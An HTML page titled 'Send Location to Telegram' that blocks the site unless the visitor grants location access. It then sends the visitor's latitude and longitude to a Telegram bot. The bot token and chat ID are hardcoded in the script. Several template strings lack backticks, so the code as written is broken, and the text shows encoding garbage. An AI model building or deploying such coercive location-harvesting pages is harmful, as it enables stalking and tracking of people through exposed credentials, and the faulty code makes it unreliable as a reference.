<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send Location to Telegram</title>
<script src="https://cdn.tailwindcss.com"></script>

<style>
/* Popup fade-in */
@keyframes fadeIn {
  from { opacity: 0; }
  to { opacity: 1; }
}
.fade-in {
  animation: fadeIn 0.4s ease-in-out;
}

/* Spinner animation */
@keyframes spin { 
  0% { transform: rotate(0deg);} 
  100% { transform: rotate(360deg);} 
}
.spinner { animation: spin 1s linear infinite; }

</style>
</head>

<body class="bg-gradient-to-r from-blue-400 via-purple-500 to-pink-500 h-screen flex items-center justify-center font-sans">

<!-- POPUP -->
<div id="popup" class="fade-in fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
    <div class="bg-white p-8 rounded-3xl text-center shadow-2xl w-80">
        <h2 class="text-xl font-bold mb-4">Please enable your location</h2>
        <p class="text-gray-600 mb-6">
            Do you agree to activate your device location?
        </p>

        <div class="flex justify-center gap-4">
            <button id="yesBtn" class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-full">
                Yes
            </button>

            <button id="noBtn" class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-full">
                No
            </button>
        </div>
    </div>
</div>

<!-- MAIN CONTENT -->
<div id="main" class="hidden bg-white rounded-3xl shadow-2xl p-10 w-full max-w-md text-center">
    <h1 class="text-2xl font-bold mb-4">Location Access</h1>

    <div id="status" class="text-gray-700 mb-6 flex justify-center items-center">
        <svg class="spinner w-8 h-8 mr-2 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <circle cx="12" cy="12" r="10" stroke-width="4"></circle>
        </svg>
        Waiting for location...
    </div>

    <button id="sendLocation" 
            class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-full shadow-lg transition-all duration-300 hidden">
        Send Location to Telegram
    </button>
</div>


<script>
const BOT_TOKEN = "7851461640:AAFsqqe9niiYzPRuAZl3qK22e8aX3ZdJk4k";
const CHAT_ID = "7570861617";

const popup = document.getElementById("popup");
const main = document.getElementById("main");
const yesBtn = document.getElementById("yesBtn");
const noBtn = document.getElementById("noBtn");
const sendBtn = document.getElementById("sendLocation");

// IF USER CLICKS YES
yesBtn.onclick = () => {
    popup.style.display = "none";
    main.classList.remove("hidden");
    requestLocation();
};

// IF USER CLICKS NO â€” BLOCK THE WEBSITE
noBtn.onclick = () => {
    document.body.innerHTML = `
        <div class="h-screen flex items-center justify-center text-white text-2xl font-bold">
            You cannot enter without allowing location access.
        </div>
    `;
};

function showError(message){
    document.getElementById("status").innerHTML =
        <span class="text-red-500 font-semibold">${message}</span>;
}

function sendLocationToTelegram(lat, lon) {
    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: ðŸ“ User Location:\nLatitude: ${lat}\nLongitude: ${lon}
        })
    }).then(res => {
        if(res.ok){
            document.getElementById("status").innerHTML = "âœ… Location sent successfully!";
            sendBtn.classList.add("hidden");
        } else {
            showError("Error sending location. Try again.");
        }
    }).catch(err => showError("Error: " + err));
}

function requestLocation() {
    if(!navigator.geolocation){
        showError("Your browser does not support geolocation.");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;

            document.getElementById("status").innerHTML = "ðŸ“ Location ready.";

            sendBtn.classList.remove("hidden");
            sendBtn.onclick = () => sendLocationToTelegram(lat, lon);
        },
        err => {
            if(err.code === err.PERMISSION_DENIED){
                showError("You must allow location to continue.");
            } else {
                showError("Error getting location: " + err.message);
            }
        }
    );
}
</script>

</body>
</html>
